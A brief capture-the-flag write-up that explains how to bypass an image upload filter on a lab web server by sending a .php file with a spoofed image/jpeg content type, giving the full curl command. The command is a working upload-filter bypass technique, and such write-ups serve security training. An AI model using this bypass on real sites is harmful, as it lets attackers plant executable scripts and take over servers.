To get this flag, you have to send a POST request containing a .php file instead of a .jpeg file.
To do so, you need to change the content type of the file (not the content type of the whole request).

You can for example use this curl command :

curl -F 'MAX_FILE_SIZE=100000' -F 'uploaded=@image.php;type=image/jpeg' -F 'Upload=Upload' http://10.2.8.36/index.php\?page\=upload
